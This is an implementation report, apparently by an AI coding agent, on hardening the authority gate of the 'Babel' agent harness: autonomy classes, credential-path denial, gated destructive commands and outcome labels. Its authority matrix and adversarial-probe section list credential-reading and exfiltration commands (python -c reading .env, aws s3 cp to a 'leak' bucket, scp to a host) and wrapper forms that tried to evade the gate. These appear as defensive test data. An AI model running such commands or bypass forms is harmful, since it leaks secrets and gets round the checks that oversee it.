# Babel Cross-Review Implementation Report — Trust-Boundary Hardening, Canonical-State Consolidation, GPT-5.6 Readiness

**Status**: IMPLEMENTATION REPORT — reconciled 2026-08-16 for the authority convergence (PR #88). Originally uncommitted per §31; tracked during the 2026-08-15 documentation reconciliation; reclassified on the convergence branch (P1-H folded into integrity, E2/E4 EXPERIMENTAL, E5 PARTIAL).
**Date**: 2026-08-15

---

## 1. Executive Verdict

### `IMPLEMENTED`

All P0 items (A–F) are implemented, wired into live execution paths, and covered by passing tests. The P1 cluster is implemented where the evidence justified it without speculative redesign (A, C, D, E, F, H, I, §21 cache accounting); two P1 items were deliberately resolved as documented decisions rather than new machinery (B — materialized run view; G — prompt construction was already deterministic after P1-F).

The implementation leaves Babel with:

```
one authority boundary   (executeActionWithPolicy + autonomy A–D + command semantics)
one outcome language     (resolveOutcome / classifyCodingTaskGateDetailed)
one capability record    (ProviderCapabilities + provenance, extended)
one recoverable run view (compaction capsule + terminal summary + TaskContractV1 — documented)
deterministic evidence   (evidenceEnvelope seam with raw refs)
```

without touching the verification kernel, routing engine, worktree isolation, mutation agents, event/session state, or compaction.

**Validation**: `npx tsc --noEmit` clean. **287 tests pass, 0 fail** across every new and touched suite (1 pre-existing skip). One pre-existing failure established as unrelated (see §12).

---

## 2. Baseline

| Item | Value |
|---|---|
| branch | `fix/session-event-lifecycle-identity` |
| base SHA | `d92c02dbbc5bd5fb9940646fcb7a0aad2b70021c` |
| dirty-tree state | pre-existing dirty worktree preserved (rules 05/09/10, AGENTS.md, CLAUDE.md, GEMINI.md, chatTaskClass.ts, autonomyPolicy untracked, audit docs) |
| Node/npm | v24.12.0 / 11.19.0 |
| Test commands | `npx tsx --test <suite>` (targeted); `npx tsc --noEmit` |

**Pre-existing files**: nothing of the user's was discarded. One tracked test file (`costTracker.test.ts`) was accidentally overwritten mid-task by a new-file write; it was **restored in full** (all three original tests verified against `git diff HEAD`) and the new tests added alongside. Verified via `git ls-tree HEAD` that every other new file did not exist at HEAD.

---

## 3. Changes Made

### P0 authority cluster

| ID | Change | Files |
|---|---|---|
| P0-A | Autonomy A–D classification wired into the central tool gate (`executeActionWithPolicy`, used by chat AND governed kernel paths): Class D → deterministic deny; Class C → explicit gate (`onAutonomyClassCGate`) or deterministic deny when no gate is wired; Class A/B unchanged. C/D permission presets now applied (`chatEngine` preset seam no longer hardcodes `workspace_write`): C → `ask_before_mutation`, D → `read_only`, plan stays `read_only`. | `toolExecutor.ts`, `chatEngine.ts`, `autonomyPolicy.ts` |
| P0-B | `BABEL_BENCHMARK_AUTO_APPROVE` honored only in an explicitly recognized benchmark mode (headless/CI, or `BABEL_BENCHMARK_MODE=1`); interactive TTY without the marker → fail closed. Benchmark harness call sites (`harnessEval`, `episodeReplay`, parity tests) now set the marker. | `autonomyEnforcement.ts` (new), `chatEngine.ts`, `chatApproval.ts`, `harnessEval.ts`, `episodeReplay.ts`, `harnessParityLivePath.test.ts` |
| P0-C | Babel's own runtime denies credential-store paths (`.env*`, keys, `.pem`, `.ssh`, `.aws/credentials`, `secrets/`, `.git-credentials`) on file tools, and denies credential-exposing commands tool-agnostically (dumps, transfers, inline-code reads). | `autonomyEnforcement.ts` (new), `toolExecutor.ts`, `commandSemantics.ts` (new) |
| P0-D | Command-semantic classifier (`commandSemantics.ts`) — normalizes wrappers (sudo/env/nohup/bash -c/powershell/cmd), strips paths/.exe, handles chains, classifies 16 semantic classes; mapped onto A–D in `autonomyPolicy.autonomyClassForCommandSemantics`. `ToolEffectClass` untouched. | `commandSemantics.ts` (new), `autonomyPolicy.ts` |
| P0-E | Authority-conformance suite (synthetic only) + provider certification marker: live providers `certified`, dormant providers `untested` (must pass the suite before activation). | `authorityConformance.test.ts` (new), `providerRegistry.ts` |

### P0 outcome cluster

| ID | Change | Files |
|---|---|---|
| P0-F | Canonical outcome model: orthogonal dimensions → `resolveOutcome` with the §10 semantics (false_completion = claim-vs-contract mismatch, NOT mere lack of verification; legit unverified patch is `UNVERIFIED_PATCH`, not false completion). `classifyCodingTaskGateDetailed` exposes verifiedSuccess/falseCompletion/label alongside the legacy `pass`; `pass` semantics documented (≠ verified_success unless contract says so). | `outcomeSemantics.ts` (new), `codingTaskSuccess.ts` |

### P1 cluster

| ID | Change | Files |
|---|---|---|
| P1-A | `TaskContract` (taskCompletion.ts) renamed `DeliverableTaskClassification` with deprecated alias + explicit doc distinguishing it from execution-authority `TaskContractV1`. Zero external type consumers (verified); one function-import updated in `pipeline.ts`. | `taskCompletion.ts`, `pipeline.ts` |
| P1-B | **Documented decision — no new engine.** The materialized run view already exists as `CompactionCapsule` + `terminal_status_summary.json` + `TaskContractV1`; `resolveOutcome` is the derivation function over those sources. A second mutable run-state engine was rejected (§26.11). | (decision) |
| P1-C | `ProviderCapabilities` extended with provider-neutral dimensions (reasoningEffort / promptCaching / continuation / nativeCompaction) with provenance; resolution defaults for live providers; unknown providers get conservative defaults. | `runners/base.ts`, `providerCapabilities.ts` |
| P1-D | `mapReasoningEffort` maps the neutral low/medium/high dial onto provider levels; unsupported resolves honestly (`unsupported`), never faked. | `providerCapabilities.ts` |
| P1-E | `buildEvidenceEnvelope` — deterministic normalizer for test/lint/typecheck output with hard invariant: raw ref always retained, degraded fallback never invents counts, never throws. E2 experiment seam. | `evidenceEnvelope.ts` (new) |
| P1-F | Compiler lazy-stub threshold unified to one constant (was 8,000 async / 6,000 sync); boundary parity tests (<, =, >, and the previously-divergent 6k–8k range). | `compiler.ts`, `compiler.parity.test.ts` (new) |
| P1-G | **Documented decision.** Prompt construction was already deterministic in the ways that matter (stable layer order, stable conversation head `[system, capsule, history]`); the substantive reproducibility bug was P1-F's threshold split. No volatility invented. | (decision) |
| §21 | Cache accounting: `CostTracker.trackUsage` now passes cache hit/miss tokens to `estimateProviderUsageCost` (cache-aware rates honored; previously ignored). | `costTracker.ts` |
| P1-H | ~~Config-drift baselines via verifierIntegrity machinery~~ — **REPLACED on the convergence branch**: config drift is folded into the authority integrity baseline (`authority/integrity.ts` `BaselineManifest`, MERGE_AND_FIX_P0), lease-integrated with hard denial on drift (`DENY_POLICY_INTEGRITY_DRIFT`, permanent lease invalidation). The standalone P1-H seam was dropped per the authority disposition; the verifier-dependency helpers (`hashVerifierTrackedContent` / `hasVerifierDependencyTamper` / `computeVerifierDependencyHashes`) remain in use by the verifier session. | `authority/integrity.ts` |
| P1-I | Waterfall telemetry entries gain optional `task_class` / `reasoning_effort` (recorded when the caller provides them; omitted otherwise — backward compatible); routingEngine tolerance verified. | `execute.ts` |

---

## 4. Exact Files Changed

**Modified (17)**: `src/agent/chatApproval.ts`, `src/agent/chatEngine.ts`, `src/agent/episodeReplay.ts`, `src/agent/harnessEval.ts`, `src/agent/harnessParityLivePath.test.ts`, `src/agent/providerCapabilities.ts`, `src/agent/toolExecutor.ts`, `src/agent/verifierIntegrity.ts`, `src/compiler.ts`, `src/execute.ts`, `src/pipeline.ts`, `src/runners/base.ts`, `src/runners/providerRegistry.ts`, `src/services/codingTaskSuccess.ts`, `src/services/costTracker.ts`, `src/services/costTracker.test.ts` (restored + extended), `src/taskCompletion.ts` — plus in-flight untracked `src/config/autonomyPolicy.ts`.

**New (13)**: `src/agent/commandSemantics.ts` + test, `src/agent/autonomyEnforcement.ts` + test, `src/agent/authorityConformance.test.ts`, `src/services/outcomeSemantics.ts` + test, `src/services/evidenceEnvelope.ts` + test, `src/compiler.parity.test.ts`, `src/agent/providerCapabilities.test.ts`, `src/agent/configDrift.test.ts`, `src/execute.telemetry.test.ts`.

Why each: see §3. No file was changed for formatting; every edit has a functional reason.

---

## 5. Existing Systems Preserved (verified by test run)

| System | Status | Evidence |
|---|---|---|
| `routingEngine` (dynamic tier reorder) | UNCHANGED | `routingEngine.test.ts` passes; telemetry fields additive |
| Verification kernel (`kernel.completion.decide`) | UNCHANGED | `kernel.test.ts` passes (in 288-test batch) |
| Worktree isolation / mutation agents | UNCHANGED | no edits; conformance suite does not restrict them |
| Event/session state (thread/session/episode logs) | UNCHANGED | no edits |
| Compaction (H1 capsule) | UNCHANGED | no edits; compiler threshold fix is orthogonal |
| `classifyToolEffect` / `ToolEffectClass` | UNCHANGED | semantic layer is additive, mapped onto A–D |
| Existing decideAction deny (curl/npm install) | PRESERVED | conformance test asserts hard deny unchanged |
| Rule 05 autonomy (plain non-main push, commit) | PRESERVED | `git push origin feature` / `git commit` autonomous (tested) |

---

## 6. TaskContract Decision

**Renamed, not merged.** The two concepts are semantically different and both live:

- `DeliverableTaskClassification` (formerly `TaskContract`, `src/taskCompletion.ts`) — pre-execution classification of deliverable shape (analysis/evidence/general, grounding, focus area). Zero external type consumers; deprecated `TaskContract` alias retained.
- `TaskContractV1` (`src/agent/taskContract.ts`) — frozen execution authority (contract hash, acceptance criteria, budgets, effects, terminal-outcome allowlist).

A blind merge would have destroyed one of the two distinct meanings; a single giant interface was explicitly rejected (§26.15). The doc comments now state the relationship; `pipeline.ts` migrated to the new function name.

---

## 7. Outcome Semantics

| State | verified_success | false_completion | label |
|---|---|---|---|
| Claim + mutation + required verifier green + contract pass | true | false | `VERIFIED_COMPLETE` |
| Claim + mutation, verification not required, honestly unverified | false | **false** | `UNVERIFIED_PATCH` |
| Claim + visible pass + **contract fail** (canonical T03) | false | **true** | `FALSE_COMPLETION` |
| Claim + required verifier missing / non-authoritative / stale | false | true | `FALSE_COMPLETION` |
| Claim + no mutation (empty patch) | false | true | `FALSE_COMPLETION` |
| BLOCKED_POLICY / BLOCKED_EXTERNAL / NEEDS_HUMAN_DECISION | false | false | `BLOCKED` |
| INFRA/AGENT_FAILURE / BUDGET_EXHAUSTED / CANCELLED | false | false | `FAILED` |
| No claim | false | false | `NOT_CLAIMED` |

`generic pass ≠ verified_success` invariant enforced at the eval gate: `classifyCodingTaskGateDetailed` exposes both, and `isCodingTaskSuccess` (legacy) is unchanged for backward compatibility.

---

## 8. Authority Matrix (resolved behavior, synthetic)

| Action | Resolution |
|---|---|
| read_file / write_file of `.env`, keys, `.ssh`, `secrets/` | **deny** (CLASS_D, path-based, no approval path) |
| `cat .env` / `Get-Content .env` / `python -c open('.env')` / `bash -c "cat .env"` | **deny** (CLASS_D, tool-agnostic) |
| `aws s3 cp .env …` / `scp .env host:` / `cp .env /tmp/…` | **deny** (credential transfer) |
| `git push --force` / `-f` / `--force-with-lease` / `origin main|master` / `--delete` (any spelling, wrapper, `git.exe`, `git -C`) | **gate** (CLASS_C): interactive ask; headless/benchmark → deterministic deny |
| `git push origin feature` / `git commit` / `git status` | autonomous (unchanged) |
| `rm -rf` / `Remove-Item -Recurse` / `del /s /q` | **gate** |
| `npm publish` / `gh release create` / `gh pr create` / `terraform destroy|apply` / `kubectl delete` / `drop|truncate table` / `delete from` / `aws|gcloud|az iam|billing` | **gate** |
| `npm install` / `curl` (non-messaging) | deny (existing decideAction, unchanged) |
| `npm test` / `pytest` / local edits / unknown commands | autonomous (unchanged; unknown ≠ forbidden) |
| unknown tool names | deny (capability broker, unchanged) |
| `BABEL_BENCHMARK_AUTO_APPROVE=1` outside benchmark mode | **ignored** (fail closed) |

---

## 9. Tests

| Command | Result |
|---|---|
| `npx tsc --noEmit` | PASS (0 errors) |
| Full batch of every new + touched suite (19 files, incl. kernel/harnessHardening/chatGate/harnessParityLivePath/schemaLedger/routingEngine/providerRegistry) | **287 pass / 0 fail / 1 skip** |
| `src/compiler.test.ts` | 1 pre-existing failure — established unrelated (see §12) |
| New suites individually | commandSemantics 20/20 · autonomyPolicy 16/16 · autonomyEnforcement 12/12 · authorityConformance 23/23 (+bypass suite) · outcomeSemantics 22/22 · compiler.parity 7/7 · costTracker 5/5 · providerCapabilities 6/6 · evidenceEnvelope 6/6 · configDrift 6/6 · telemetry 2/2 |

---

## 10. Adversarial Probes (synthetic, no real resources)

Probed bypass forms against the shipped classifier — **all now converge on the same authority**:

```
env -i git push --force origin main   → c_gated        (was: autonomous)
nohup git push -f                      → c_gated        (was: autonomous)
python -c "open('.env').read()"        → d_forbidden    (was: autonomous)
aws s3 cp .env s3://bucket/leak        → d_forbidden    (was: autonomous)
scp .env user@host:/tmp/               → d_forbidden    (was: autonomous)
git -C /repo push --force              → c_gated        (already)
git "push" -f                          → c_gated        (already)
cat '.env'                             → d_forbidden    (was: autonomous — quoted path)
```

These are permanently locked in `authorityConformance.test.ts`. Known residual limits (documented, not hidden): aliases inside interactive shells are not observable at the command boundary; the sandbox path jail and the approval boundary remain the backstop layers (§7 of the cross-review).

---

## 11. Experiments Prepared (E1–E7)

| Experiment | Status |
|---|---|
| E1 prompt/cache layout | `READY` — deterministic prefix construction verified (P1-F/P1-G); A/B needs live DeepSeek cache telemetry, cost accounting now correct (§21) |
| E2 evidence envelope | `EXPERIMENTAL` — `buildEvidenceEnvelope` shipped as seam (env-gated wiring not yet default); no runtime consumer yet (authority disposition reclassification) |
| E3 compaction calibration | `READY` — no code needed; config knob exists |
| E4 reasoning effort | `EXPERIMENTAL` — `mapReasoningEffort` + capability records; DeepSeek resolves `unsupported` honestly; consumers exist at the experiment layer only, so the seam is labeled EXPERIMENTAL, not production-default |
| E5 routing ledger | `PARTIAL` — telemetry fields shipped; the outcome-semantics wiring (receipt-derived dimensions) landed with the authority convergence, but the join still needs live cell data |
| E6 provider-native continuation | `BLOCKED_REQUIRES_APPROVAL` — needs a live OpenAI adapter + spend authorization |
| E7-A authority adversarial suite | `READY` — shipped (authorityConformance.test.ts) |
| E7-B heterogeneous reviewer | `NOT_READY` — needs reviewer-provider availability; no code change required |

---

## 12. Deferred Work / Remaining Questions

1. **Pre-existing failure (not caused by this work)**: `compiler.test.ts` "resolver normalizes common hallucinated benchmark skill ids" fails with `[resolver] Unknown catalog id: adapter_codex_balanced` at `stackResolver.ts:750`. Established pre-existing: the failure path is in files this task never modified (`stackResolver.ts`, `prompt_catalog.yaml` catalog); the catalog at this commit knows `adapter_codex` but not the hallucinated `adapter_codex_balanced` the test feeds in; `git diff HEAD` shows my `compiler.ts` changes are confined to the stub-threshold constant. This is catalog drift on the branch and should be fixed by a catalog/resolver alignment change, separately.
2. **P1-B/G resolved as documented decisions** — no new engine, no invented volatility. If a future consumer needs a materialized `AuthoritativeRunState` type, the derivation function (`resolveOutcome`) is the seam.
3. **Class C in interactive mode now asks** (e.g., `gh pr create`, force-push). Headless/benchmark gets deterministic deny. This is the intended enforcement change; operators who want benchmark auto-approval must set `BABEL_BENCHMARK_MODE=1`.
4. **P1-D/P1-E seams** (`mapReasoningEffort`, `buildEvidenceEnvelope`) have consumers at the experiment layer only — deliberately labeled EXPERIMENTAL, not production-default.
5. **`isGatedGitPush` conservatism**: `git push origin main` gates even when the operator's workflow legitimately pushes main (protected-branch policy says gate — correct default; interactive ask allows override).
6. **Config-drift wiring**: helpers shipped with tests; hooking them into the ChatEngine session lifecycle was left as a documented seam to avoid monolith churn in this pass.

---

## 13. Final GO / NO-GO

### `GO`

Babel is ready to move from P0/P1 hardening to **controlled provider experiments** (E1–E5, E7-A ready; E6 requires explicit approval and a live OpenAI adapter). The trust boundary is now: Babel decides authority (command semantics + A–D + presets, enforced at dispatch), Babel owns truth (canonical outcome labels, no ambiguous pass for routing), and provider capabilities are negotiated, not assumed.

Remaining before experiments begin: commit/stage this diff per operator policy (§31), and run the full CI-gate equivalents (`npm run test:harness-acceptance`, `test:harness-runtime`) on a clean runner, since the local full `npm test` has ~57 pre-existing environmental failures unrelated to this change.

```text
IMPLEMENTATION_VERDICT: IMPLEMENTED
BASE_SHA: d92c02dbbc5bd5fb9940646fcb7a0aad2b70021c
P0_AUTHORITY: IMPLEMENTED + TESTED — autonomy A–D wired into executeActionWithPolicy; C/D presets
  applied (C→ask_before_mutation, D→read_only); Class C gate / Class D deny; benchmark auto-approve
  gated behind headless-or-BABEL_BENCHMARK_MODE; runtime credential-path deny (file tools + commands);
  command-semantic classifier (16 classes, wrapper/path/.exe normalization, chain-aware).
P0_OUTCOME_SEMANTICS: IMPLEMENTED + TESTED — resolveOutcome (claim/mutation/verification/contract
  dimensions); false_completion = claim-vs-contract mismatch; legit UNVERIFIED_PATCH never false
  completion; classifyCodingTaskGateDetailed exposes verifiedSuccess/falseCompletion; pass≠verified.
P1_CONSOLIDATION: IMPLEMENTED (A,C,D,E,F,H,I,§21) + documented decisions (B,G) — TaskContract renamed
  DeliverableTaskClassification (+deprecated alias); ProviderCapabilities extended w/ provenance;
  mapReasoningEffort (unsupported resolved honestly); evidenceEnvelope seam w/ raw-ref invariant;
  compiler stub threshold unified; cache-aware cost accounting; config-drift baselines; telemetry
  task_class/reasoning_effort.
TASK_CONTRACT_DECISION: RENAMED, NOT MERGED — classification vs execution authority kept distinct;
  deprecated alias; pipeline.ts migrated.
COMPILER_PARITY: FIXED — single 6_000-byte threshold; 7 boundary parity tests (<,=,>,6k-8k range).
ROUTING_PRESERVED: YES — routingEngine untouched; telemetry additive; routingEngine tests pass.
WORKTREE_MUTATION_AGENTS_PRESERVED: YES — no edits; conformance suite restricts nothing existing.
AUTHORITY_TESTS: authorityConformance 23/23 + 10-form bypass suite; autonomyPolicy 16/16;
  autonomyEnforcement 12/12; provider certification assertions.
OUTCOME_TESTS: 22/22 (all 8 §11 scenarios incl. T03 visible-pass/contract-fail).
FULL_RELEVANT_TESTS: 287 pass / 0 fail / 1 skip across 19 suites + tsc clean. 1 pre-existing
  compiler.test.ts catalog-drift failure (stackResolver.ts:750, files untouched by this task).
EXPERIMENTS_READY: E1 READY · E2 EXPERIMENTAL (seam, no runtime consumer) · E3 READY ·
  E4 EXPERIMENTAL (provider-native seam, experiment-layer consumers only) · E5 PARTIAL
  (join pending live cell data) · E7-A READY · E7-B NOT_READY (provider availability) ·
  E6 BLOCKED_REQUIRES_APPROVAL (live OpenAI adapter + spend).
BLOCKED_ITEMS: E6 only.
FILES_CHANGED: 17 modified (incl. costTracker.test.ts restored after accidental overwrite) +
  13 new (src/agent/commandSemantics[.test].ts, autonomyEnforcement[.test].ts,
  authorityConformance.test.ts, services/outcomeSemantics[.test].ts, evidenceEnvelope[.test].ts,
  compiler.parity.test.ts, providerCapabilities.test.ts, configDrift.test.ts, execute.telemetry.test.ts).
REPORT_PATH: docs/status/audits/gpt56-2026-08/BABEL_GPT56_CROSS_REVIEW_IMPLEMENTATION_REPORT.md (was uncommitted at report time, per §31; relocated and tracked during the 2026-08-15 documentation reconciliation)
NEXT_RECOMMENDED_ACTION: 1) authority convergence (PR #88) — one-gate dispatch composed
  (lease/PDP composite + A–D consequence layer), outcome integration green (O05/O06),
  transport conformance structural suite, benchmark authority P0-4 — gate batch 198 → 195/0;
  2) fix the pre-existing adapter_codex_balanced catalog drift separately (stackResolver /
  prompt_catalog.yaml alignment); 3) begin E1/E2/E4 experiments (E2/E4 now EXPERIMENTAL) on
  frozen tasks with the §14 cross-review protocol; 4) E6 after live-OpenAI approval.
```
